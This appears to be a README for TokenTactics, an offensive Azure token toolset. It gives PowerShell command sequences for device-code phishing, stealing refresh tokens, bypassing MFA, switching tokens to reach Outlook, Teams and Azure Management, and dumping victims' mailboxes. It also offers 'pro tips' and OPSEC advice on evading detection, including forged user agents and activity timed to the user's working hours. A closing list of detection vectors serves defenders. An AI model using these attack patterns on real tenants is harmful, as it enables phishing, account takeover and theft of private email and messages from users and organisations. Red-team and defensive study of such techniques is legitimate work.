TokenTactics

Azure JSON Web Token ("JWT") Manipulation Toolset

What it is

Azure access tokens allow you to authenticate to certain endpoints as a user who signs in with a device code. Even if they used multi-factor authentication. Once you have a user's access token, it may be possible to access certain apps such as Outlook, SharePoint, OneDrive, MSTeams and more.

For instance, if you have a Graph or MSGraph token, you can then connect to Azure and dump users, groups, etc. You could then, depending on conditional access policies, switch to an Azure Core Management token and run AzureHound. Then, switch to an Outlook token and read/send emails or MS Teams and read/send messages!

For more on Azure token types Microsoft identity platform access tokens

There are some example requests to endpoints in the resources folder. There is also an example phishing template for device code phishing.

You may also use these tokens with AAD Internals as well. We strongly recommended to check this amazing tool out.

Installation and Usage


### Generate Device Code

Once the user has logged in, you'll be presented with the JWT and it will be saved in the $response variable. To access the access token use $response.access_token from your PowerShell window to display the token. You may also display the refresh token with $response.refresh_token. Hint: You'll want the refresh token to keep refreshing to new access tokens! By default, Get-AzureToken results are logged to TokenLog.log.

Attack Patterns

Pattern: Device Code Phishing → Token Theft → Full Access

# 1. Send phishing email with device code
Get-AzureToken -Client MSGraph
# Send victim the device code via phishing email

# 2. Wait for victim to authenticate
# When they enter the code, you get tokens

# 3. Save refresh token (critical!)
$refreshToken = $response.refresh_token

# 4. Switch to different resources as needed
Invoke-RefreshToOutlookToken -domain company.com -refreshToken $refreshToken
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $OutlookToken.access_token -mailFolder inbox

Invoke-RefreshToMSTeamsToken -domain company.com -refreshToken $refreshToken
# Access Teams data

Invoke-RefreshToAzureCoreManagementToken -domain company.com -refreshToken $refreshToken
# Run AzureHound with this token

Pattern: Single Refresh Token → Multi-Resource Access

# 1. Start with one refresh token (from any source)
$rt = "0.AQEA..."

# 2. Get MS Graph for user/group enumeration
Invoke-RefreshToMSGraphToken -domain company.com -refreshToken $rt
Connect-AzureAD -AadAccessToken $MSGraphToken.access_token -AccountId user@company.com
Get-AzureADUser
Get-AzureADGroup

# 3. Switch to Azure Management for resource enumeration
Invoke-RefreshToAzureCoreManagementToken -domain company.com -refreshToken $rt
# Use with AzureHound, PowerZure, etc.

# 4. Switch to Outlook for email access
Invoke-RefreshToOutlookToken -domain company.com -refreshToken $rt
Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $OutlookToken.access_token -mailFolder inbox

# 5. Switch to Teams for message access
Invoke-RefreshToMSTeamsToken -domain company.com -refreshToken $rt
# Access Teams channels and chats

Pattern: MFA Bypass via Token Refresh

# Even if user has MFA, once they auth with device code:
# 1. Capture refresh token
$rt = $response.refresh_token

# 2. Refresh tokens do NOT require MFA
# Can refresh indefinitely without MFA prompts
Invoke-RefreshToMSGraphToken -domain company.com -refreshToken $rt

# 3. Tokens remain valid even after:
# - User closes browser
# - User logs out
# - User goes offline
# Refresh token valid for months/years depending on policy

Pro Tips

💡 Refresh Tokens are Gold: Save them - valid for months/years 💡 MFA Bypass: Device code + refresh token = MFA bypass for token lifetime 💡 Multi-Resource: One refresh token → tokens for all resources 💡 Token Log: Commands log to TokenLog.log by default 💡 Parse Before Use: Always parse JWT to verify claims and expiration 💡 PRT Client ID: Use 1b730954-1685-4b74-9bfd-dac224a7b894 for PRT-derived tokens 💡 Combine Tools: Use TokenTactics with AADInternals, AzureHound, PowerZure 💡 Device Code Phishing: More successful than credential phishing (users trust MS) 💡 User Agent: Consider using Invoke-ForgeUserAgent for evasion 💡 Token Lifetime: Access tokens ~1 hour, refresh tokens months/years

OPSEC Considerations

⚠️ High Risk:

  • Device code phishing from suspicious domains/IPs
  • Rapid token switching (many refresh operations)
  • Accessing resources user wouldn't normally access

⚠️ Medium Risk:

  • Using tokens from unusual locations/IPs
  • Accessing mailbox outside normal hours
  • Dumping large amounts of data

✅ Lower Risk:

  • Using tokens from same location as user
  • Accessing during user's normal working hours
  • Using forged user agents
  • Slow, methodical access patterns

Detection Vectors:

  • Azure AD sign-in logs (device code authentication)
  • Token refresh events
  • Access from new locations
  • Unusual Graph API calls
  • Multiple resource access in short time
  • Token issued to unexpected clients
